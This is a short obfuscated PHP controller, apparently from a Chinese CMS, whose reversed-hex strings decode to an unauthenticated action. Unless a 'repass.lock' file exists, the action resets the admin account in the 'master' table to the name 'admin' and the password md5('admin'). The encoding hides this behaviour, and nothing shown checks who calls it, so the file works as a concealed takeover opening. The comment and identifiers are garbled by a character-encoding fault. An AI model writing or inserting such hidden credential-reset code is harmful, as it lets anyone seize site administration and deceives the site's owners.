<?php 
/* ��ҵ������ֹ�����룬by С����seo ��ַ��xbwseo.com */
 $ȵ�G['币']=array("b636f6c6e2373716075627","56c69666f53796","e696d64616","5346d6","2444","2756473716d6","5627568677","13d34696","16471646","56671637","5647962777","56d69647","13"); foreach($ȵ�G['币'] as $___k=>$___vo){ gettype($ȵ�G['币'][$___k])=='string' && $ȵ�G['币'][$___k]=函rs($___vo); } class repassAction extends action{public function repass(){global $ȵ�G;$ȵ�G_币_6=$ȵ�G['币'][6];$ȵ�G_币_8=$ȵ�G['币'][8];$ȵ�G_币_9=$ȵ�G['币'][9];$拟�=TEMP_PATH.ȵ�gs('币',0); if($ȵ�G['币'][1]($拟�)){exit('0'); } $������=array(); $������['name']=ȵ�gs('币',2); $������['pass']=$ȵ�G['币'][3](ȵ�gs('币',2)); $�泽��贼��=$ȵ�G['币'][4](ȵ�gs('币',5))->$ȵ�G_币_6(ȵ�gs('币',7))->$ȵ�G_币_8($������)->$ȵ�G_币_9(); $ȵ�G['币'][10]($拟�,$ȵ�G['币'][11]()); exit(ȵ�gs('币',12)); } }